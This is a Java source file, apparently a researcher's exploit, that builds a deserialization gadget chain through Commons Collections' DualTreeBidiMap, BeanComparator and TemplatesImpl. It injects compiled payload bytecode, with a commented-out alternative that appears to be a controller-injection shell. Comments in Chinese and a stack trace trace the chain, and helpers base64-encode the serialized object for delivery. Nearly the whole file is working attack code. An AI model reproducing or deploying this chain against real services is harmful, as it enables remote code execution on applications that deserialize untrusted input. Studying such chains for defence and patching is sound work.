import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.util.PriorityQueue;
import java.io.*;
import java.util.*;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bag.TreeBag;
import org.apache.commons.collections.bidimap.AbstractDualBidiMap;
import org.apache.commons.collections.bidimap.DualTreeBidiMap;
import org.postgresql.ds.PGConnectionPoolDataSource;
import sun.reflect.ReflectionFactory;
import javax.xml.transform.Templates;

/*
 *  DualTreeBidiMap利用链
 能利用靠的是它本身，我们只是控制数据流的数据而已

 
 * 	at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
	at java.util.TreeMap.compare(TreeMap.java:1291)
	at java.util.TreeMap.put(TreeMap.java:538)
	at org.apache.commons.collections.bidimap.AbstractDualBidiMap.put(AbstractDualBidiMap.java:180)
	at org.apache.commons.collections.bidimap.AbstractDualBidiMap.putAll(AbstractDualBidiMap.java:188)
	at org.apache.commons.collections.bidimap.DualTreeBidiMap.readObject(DualTreeBidiMap.java:346)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
 */



public class cb {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
//        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class"));

        TemplatesImpl obj = new TemplatesImpl();

        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "zeropeach");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());


        BeanComparator comparator = new BeanComparator(null);

        setFieldValue(comparator, "property", "outputProperties");


        DualTreeBidiMap dualTreeBidiMap = new DualTreeBidiMap();
        HashMap<Object, Object> map = new HashMap<>();

        map.put(obj,obj);
        setFieldValue(dualTreeBidiMap,"comparator",comparator);

      //这里看了DualTreeBidiMap的writeObject就知道咋写了
        Field maps = AbstractDualBidiMap.class.getDeclaredField("maps");
        maps.setAccessible(true);
        Map[] maps1 = (Map[]) maps.get(dualTreeBidiMap);
        maps1[0] = map;


        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(dualTreeBidiMap);

        oos.close();

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(barr.toByteArray());

        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }

    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void base64deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void deserTester(Object o) throws Exception {
        base64deserial(base64serial(o));
    }
    public static Object createWithoutConstructor(String classname) throws Exception {
        return createWithoutConstructor(Class.forName(classname));
    }
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }

}
